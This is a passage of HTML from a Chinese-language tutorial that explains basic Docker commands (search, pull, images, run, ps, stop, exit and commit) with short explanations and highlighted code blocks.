data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker search Ubuntu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a4f456599466-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a4f456599466-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a4f456599466-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">search </span><span class=\"crayon-i\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a4f456599466-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>我们应该会得到可用的 Ubuntu 镜像的列表。记住，如果你想要的是官方的镜像，请检查 <code>official</code> 这一列上是否为 <code>[OK]</code>。</p>\n<h3 id=\"toc_4\">下载镜像</h3>\n<p>一旦搜索并找到了我们想要的镜像，我们可以运行下面语句来下载它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a53863634417\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker pull Ubuntu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a53863634417-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a53863634417-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a53863634417-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">pull </span><span class=\"crayon-i\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a53863634417-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>要查看所有已下载的镜像，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a56125928645\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker images\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a56125928645-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a56125928645-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a56125928645-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-i\">images</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a56125928645-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_5\">运行容器</h3>\n<p>使用已下载镜像来运行容器，使用下面命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a59438980109\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker run -it Ubuntu\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a59438980109-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a59438980109-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a59438980109-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">run</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">it </span><span class=\"crayon-i\">Ubuntu</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a59438980109-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>这里，使用 <code>-it</code> 会打开一个 shell 与容器交互。容器启动并运行后，我们就可以像普通机器那样来使用它了，我们可以在容器中执行任何命令。</p>\n<h3 id=\"toc_6\">显示所有的 docker 容器</h3>\n<p>要列出所有 docker 容器，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a5d811543664\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker ps\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a5d811543664-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a5d811543664-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a5d811543664-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-i\">ps</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a5d811543664-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>会输出一个容器列表，每个容器都有一个容器 id 标识。</p>\n<h3 id=\"toc_7\">停止 docker 容器</h3>\n<p>要停止 docker 容器，运行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a60276016465\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker stop container-id\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a60276016465-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a60276016465-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a60276016465-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-e\">stop </span><span class=\"crayon-v\">container</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">id</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a60276016465-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3 id=\"toc_8\">从容器中退出</h3>\n<p>要从容器中退出，执行：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a63262013171\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ exit\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a63262013171-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a63262013171-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a63262013171-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">exit</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a63262013171-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3 id=\"toc_9\">保存容器状态</h3>\n<p>容器运行并更改后（比如安装了 apache 服务器），我们可以保存容器状态。这会在本地系统上保存新创建镜像。</p>\n<p>运行下面语句来提交并保存容器状态：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a66152744540\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ docker commit 85475ef774 repository/image_name\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a66152744540-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a66152744540-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a66152744540-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-i\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">85475ef774</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">repository</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">image</span><span class=\"crayon-sy\">_</span>name</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a66152744540-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这里，<code>commit</code> 命令会保存容器状态，<code>85475ef774</code>，是容器的容器 id，<code>repository</code>，通常为 docker hub 上的用户名 （或者新加的仓库名称）<code>image_name</code>，是新镜像的名称。</p>\n<p>我们还可以使用 <code>-m</code> 和 <code>-a</code> 来添加更多信息。通过 <code>-m</code>，我们可以留个信息说 apache 服务器已经安装好了，而 <code>-a</code> 可以添加作者名称。</p>\n<p>像这样：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f33d579a6a674396665\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n docker commit -m \"apache server installed\"-a \"Dan Daniels\" 85475ef774 daniels_dan/Cent_container\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f33d579a6a674396665-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f33d579a6a674396665-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f33d579a6a674396665-1\"><span class=\"crayon-h\"> </span><span class=\"crayon-e\">docker </span><span class=\"crayon-v\">commit</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">m</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"apache server installed\"</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"Dan Daniels\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">85475ef774</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">daniels_dan</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">Cent</span><span class=\"crayon-sy\">_</span>container</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f33d579a6a674396665-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>我们的教程至此就结束了，本教程讲解了一下 Docker 中的那些重要的命令，如有疑问，欢迎留言。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113490\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113490votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113490\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio 